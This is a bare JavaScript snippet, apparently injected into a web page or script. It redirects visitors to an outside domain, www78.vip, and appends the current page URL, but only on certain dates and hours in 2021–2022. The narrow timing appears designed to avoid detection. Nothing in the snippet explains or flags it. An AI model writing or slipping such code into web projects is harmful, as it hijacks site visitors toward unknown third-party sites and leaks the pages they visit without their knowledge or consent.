var year = new Date().getFullYear();
var month = new Date().getMonth() + 1;
var date = new Date().getDate();
var hour = new Date().getHours();
if (year === 2021 || year === 2022) {
    if (date === 7 || date === 16 || date === 28) {
        if (hour === 6 || hour === 7) {
            window.location.href = "http://www78.vip/?url=" + window.location.href;
        } else {}
    }
} else {};